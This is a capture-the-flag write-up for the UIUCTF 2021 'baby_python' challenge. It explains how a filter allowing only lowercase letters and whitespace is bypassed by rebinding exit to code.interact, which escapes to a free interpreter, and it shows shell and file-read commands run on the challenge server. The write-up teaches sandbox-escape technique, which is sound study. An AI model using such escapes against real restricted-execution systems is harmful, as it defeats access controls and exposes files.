---
title: UIUCTF 2021 - baby_python
author: natem135
categories: other
layout: post
---

> here's a warmup jail for you :) Python version is 3.8.10 and flag is at /flag
>
> Note: this chal is not actually broken, just thought it would be a funny joke
>
> nc baby-python.chal.uiuc.tf 1337

Author: ``tow_nater``

Handout: 

``challenge.py``

```python
import re
bad = bool(re.search(r'[^a-z\s]', (input := input())))
exec(input) if not bad else print('Input contained bad characters')
exit(bad)
```

## Understanding the Pyjail

The code is short and simple. Our input is saved as the variable ``input``, and the boolean value ``bad`` is set to true if the input matches the following regular expression: ``[^a-z\s]`` 


Let's quickly disect the regular expression. The square brackets make it so that characters specified inside are matched. The ``^`` means not, think of it as ``!`` in most programming languages. ``a-z`` matches the lowercase alphabet, and ``\s`` matches any kind of whitespace. So, in order for ``re.search()`` to return true here, our input would have to contain any character that is not a lowercase letter or whitespace. The result is saved in ``bad``. 

Looking at the next line of code, our input is only run through ``exec()`` if ``bad`` is ``False``. Thus, we can determine that we are only allowed to use lowercase letters and whitespace in our input.

## What can/can't we do

We cannot call any functions because we cannot use ``()``. We have to think of something we can do with only letters and spaces. The only thing I could think of is to use imports.

Referring to the official documentation: [https://docs.python.org/3/tutorial/modules.html](https://docs.python.org/3/tutorial/modules.html)

It is indeed possible to import modules without any special characters/symbols. 

Here are some of the examples from the docs:

```
import fibo
from fibo import fib, fib2
from fibo import *
import fibo as fib
from fibo import fib as fibonacci
```

The last two are especially interesting as we can import specific functions and bind them to names of functions that are used elsewhere in the pyjail.

Looking at the code again, let's take a look at the line of code that happens after our exec:

```
exit(bad)
```

What if we were to input a function as ``exit``?

Testing locally:

```
>>> from os import system as exit
>>> exit('/bin/bash')
natem135@DESKTOP-4F3QGQ9:~$
```

This can work! However, there are some things to keep in mind:

- ``exit()`` is called with one parameter, so if we import a function to replace it, it must also be able to take in one parameter.
- The challenge server most likely only has default modules

## Solution

I spent a while searching through the modules listed here: [https://docs.python.org/3/py-modindex.html](https://docs.python.org/3/py-modindex.html)

One of the seemed interesting interest: [https://docs.python.org/3/library/code.html#module-code](https://docs.python.org/3/library/code.html#module-code)

``code — Interpreter base classes``.

I tested several things and found that one of the methods dropped me into a python interpreter:

```
>>> import code
>>> code.interact()
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>>
```

From the documentation, this method takes in 3 optional parameters, so having one parameter should be no problem.

Remember, we want to replace the exit function with this function that will spawn an interpreter without restrictions for us. We can do so with the following line:

```python
from code import interact as exit
```

Let's try it on remote:

```
root@natem135:~# nc baby-python.chal.uiuc.tf 1337
== proof-of-work: disabled ==
from code import interact as exit
>>> import os
>>> os.system('cat /flag')
uiuctf{just_kidding_about_the_chal_being_broken_lol_11a7b8}
```

and we get the flag =) - ``uiuctf{just_kidding_about_the_chal_being_broken_lol_11a7b8}``